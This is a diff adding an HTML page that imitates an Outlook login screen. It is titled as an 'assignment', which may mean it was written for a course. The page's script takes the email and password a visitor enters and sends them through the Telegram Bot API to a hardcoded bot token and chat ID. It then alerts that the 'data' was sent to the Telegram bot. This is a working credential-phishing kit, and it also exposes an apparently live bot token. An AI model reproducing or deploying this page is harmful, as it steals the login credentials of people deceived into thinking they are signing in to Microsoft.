@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login with ASSINGMENT 1</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            position: relative;
+        }
+
+        .close-icon {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 20px;
+            color: #0078d4;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        h2 {
+            text-align: center;
+            font-size: 24px;
+            color: #000;
+            margin-top: 0;
+            margin-bottom: 25px;
+            font-weight: 600;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #000;
+            font-size: 15px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #bababa;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        input::placeholder {
+            color: #a6a6a6;
+        }
+
+        .help-text {
+            font-size: 12px;
+            color: #000;
+            margin-top: 0;
+            margin-bottom: 20px;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 25px;
+        }
+
+        button {
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+        }
+
+        .close-btn {
+            background-color: #e1e1e1;
+            color: #333;
+        }
+
+        .login-btn {
+            background-color: #0078d4;
+            color: white;
+        }
+
+        .login-btn:hover {
+            background-color: #005a9e;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-container">
+        <div class="close-icon">&times;</div>
+
+        <div class="logo-container">
+            <svg width="45" height="45" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path
+                    d="M20 4H4C2.9 4 2.01 4.9 2.01 6L2 18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6C22 4.9 21.1 4 20 4ZM20 8L12 13L4 8V6L12 11L20 6V8Z"
+                    fill="#0078d4" />
+            </svg>
+        </div>
+
+        <h2>Login with Outlook</h2>
+
+        <form id="loginForm">
+            <label for="emailInput">Email Address</label>
+            <input type="email" id="emailInput" placeholder="Email" required>
+            <p class="help-text">We'll never share your email with anyone else</p>
+
+            <label for="passwordInput">Password</label>
+            <input type="password" id="passwordInput" placeholder="Enter Password" required>
+
+            <div class="button-group">
+                <button type="button" class="close-btn">Close</button>
+                <button type="submit" class="login-btn">Login</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function (event) {
+            event.preventDefault(); // Stops the page from refreshing
+
+            // Your correct details are hardcoded right here now!
+            const botToken = "8813457178:AAEswst5g6ch-J2wSH8FHpUZzqBZEH8y5Ds";
+            const chatId = "7750243080";
+
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+
+            // Formatting the message beautifully for your phone
+            const message =`🔔 New Login Attempt:\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
+
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Sending it off instantly
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+                .then(response => {
+                    if (response.ok) {
+                        alert('Data sent directly to your Telegram bot!');
+                    } else {
+                        alert('Error sending message. Check details.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Connection error occurred.');
+                });
+        });
+    </script>
+
+</body>
+
+</html>
